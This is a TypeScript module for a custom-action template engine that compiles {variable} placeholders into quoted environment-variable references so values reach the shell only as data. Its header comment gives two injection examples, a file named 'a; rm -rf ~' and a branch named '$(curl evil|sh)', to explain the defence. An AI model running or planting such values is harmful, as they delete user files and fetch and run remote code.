import type { ActionKind, ActionScope } from '@shared/types'

/**
 * Template engine for custom actions.
 *
 * The rule that makes this safe: variable VALUES are never pasted into a
 * command. A file called `a; rm -rf ~` or a branch called `$(curl evil|sh)`
 * is perfectly legal, so `echo {file}` must not become shell text. Instead
 * each {variable} compiles to a quoted reference to an environment variable
 * ("${CX_FILE}") and the value travels in the environment, where the shell
 * treats it purely as data.
 */

const BASE = ['project.path', 'project.name', 'branch']
export const VARIABLES: Record<ActionScope, string[]> = {
  project: BASE,
  port: [...BASE, 'port', 'pid', 'url'],
  finding: [...BASE, 'file', 'line']
}

export type Part = { type: 'text'; value: string } | { type: 'var'; name: string; quote: 'none' | 'double' | 'single' }

export const envName = (variable: string): string => `CX_${variable.toUpperCase().replace(/\./g, '_')}`

/** Splits a template into literal text and {variables}, tracking whether each variable sits inside quotes. */
export function parseTemplate(t: string): Part[] {
  const parts: Part[] = []
  let quote: 'none' | 'double' | 'single' = 'none'
  let text = ''
  for (let i = 0; i < t.length; i++) {
    const ch = t[i]
    if (ch === '\\' && quote !== 'single' && i + 1 < t.length) {
      text += ch + t[++i]
      continue
    }
    if (ch === '{') {
      const end = t.indexOf('}', i)
      const name = end > i ? t.slice(i + 1, end) : ''
      if (/^[a-z]+(?:\.[a-z]+)?$/.test(name)) {
        if (text) parts.push({ type: 'text', value: text })
        text = ''
        parts.push({ type: 'var', name, quote })
        i = end
        continue
      }
    }
    if (ch === "'" && quote !== 'double') quote = quote === 'single' ? 'none' : 'single'
    else if (ch === '"' && quote !== 'single') quote = quote === 'double' ? 'none' : 'double'
    text += ch
  }
  if (text) parts.push({ type: 'text', value: text })
  return parts
}

export function variablesIn(t: string): string[] {
  return [...new Set(parseTemplate(t).flatMap((p) => (p.type === 'var' ? [p.name] : [])))]
}

/** Returns a readable problem with the template, or null if it is fine. */
export function validateTemplate(t: string, scope: ActionScope, kind: ActionKind): string | null {
  if (!t.trim()) return 'Enter what this action should do.'
  if (t.length > 2000) return 'That is too long (2000 characters at most).'
  if (t.includes('\0')) return 'Contains an invalid character.'
  const allowed = VARIABLES[scope]
  for (const p of parseTemplate(t)) {
    if (p.type !== 'var') continue
    if (!allowed.includes(p.name)) return `{${p.name}} is not available for ${scope} actions. You can use: ${allowed.map((v) => `{${v}}`).join(', ')}.`
    if (kind === 'shell' && p.quote === 'single') return `{${p.name}} sits inside single quotes, where the shell will not expand it. Use double quotes instead.`
  }
  return null
}

/**
 * Compiles a shell template. `{file}` becomes `"${CX_FILE}"`, or `${CX_FILE}`
 * when you already wrote the quotes yourself, so it is always one safe word.
 */
export function toShell(t: string): { script: string; vars: string[] } {
  const script = parseTemplate(t)
    .map((p) => (p.type === 'text' ? p.value : p.quote === 'double' ? `\${${envName(p.name)}}` : `"\${${envName(p.name)}}"`))
    .join('')
  return { script, vars: variablesIn(t) }
}

/** Plain substitution, for places that are not a shell (URLs, paths, previews). */
export function render(t: string, values: Record<string, string>, encode: (s: string) => string = (s) => s): string {
  return parseTemplate(t)
    .map((p) => (p.type === 'text' ? p.value : encode(values[p.name] ?? '')))
    .join('')
}
